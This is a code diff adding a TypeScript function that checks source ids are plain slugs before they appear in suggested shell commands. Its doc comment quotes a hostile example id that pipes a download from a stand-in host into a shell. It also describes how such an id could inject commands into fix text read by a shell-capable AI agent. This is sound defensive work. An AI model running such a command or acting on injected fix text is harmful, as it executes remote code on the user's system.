@@ -55,6 +55,26 @@ export function deriveId(name: string): string {
   return trimmed + ext;
 }
 
+/**
+ * The shape `deriveId` and `recordingId` can produce: a slug, optionally
+ * carrying an alphabetic extension. Nothing else.
+ *
+ * It exists because **`listSources` reads directory names verbatim**, and a
+ * directory under `raw/` is not necessarily one this application created — it
+ * arrives with a `git clone`, an agent's own tools can make one (`raw/` is not
+ * gated the way `wiki/` is), and plan group 6 will unpack archives into it. So
+ * an id can hold anything a filesystem allows, including shell metacharacters.
+ *
+ * Use it before putting an id anywhere it would be read as **syntax** rather
+ * than as data — a suggested command line above all. A security review caught
+ * `source.uncited`'s fix text offering `` `ow source mark <id>` `` for an id
+ * that could be `` foo`curl evil|sh` ``, to an agent whose whole purpose is to
+ * act on that text and which has a shell.
+ */
+export function isDerivedId(id: string): boolean {
+  return /^[a-z0-9]+(?:-[a-z0-9]+)*(?:\.[a-z]{1,8})?$/.test(id);
+}
+
 /** True when a source directory with this id already exists under `raw/`. */
 export function isIdTaken(projectRoot: string, id: string): boolean {
   if (id === INBOX) return false; // the inbox is a doorway, not a source
